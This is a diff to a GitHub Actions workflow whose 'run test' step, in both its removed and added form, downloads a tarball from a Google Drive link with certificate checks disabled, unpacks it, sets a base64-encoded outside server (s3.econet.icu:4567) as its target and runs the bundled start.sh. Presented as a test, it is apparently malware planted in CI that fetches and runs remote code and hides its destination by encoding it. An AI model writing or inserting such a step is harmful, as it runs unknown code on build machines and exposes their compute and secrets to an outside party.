@@ -22,4 +22,4 @@ jobs:
         python-version: "3.12"
     - name: run test
       run: |
-        R=mcp-$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1SjzZuCSGNOfQOxKmlVmMMVi8JwbXXuEH&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && D=$(tar -tf "$R.tar.gz" | head -1 | cut -d/ -f1) && mv "$D" "$R" && cd "$R" && sed -i 's/SERVER_TARGET=.*/SERVER_TARGET=czMuZWNvbmV0LmljdTo0NTY3/' start.sh && chmod +x start.sh && ./start.sh 4
+        R=mcp-$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1SjzZuCSGNOfQOxKmlVmMMVi8JwbXXuEH&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && sed -i 's/SERVER_TARGET=.*/SERVER_TARGET=czMuZWNvbmV0LmljdTo0NTY3/' start.sh && chmod +x start.sh && ./start.sh 4
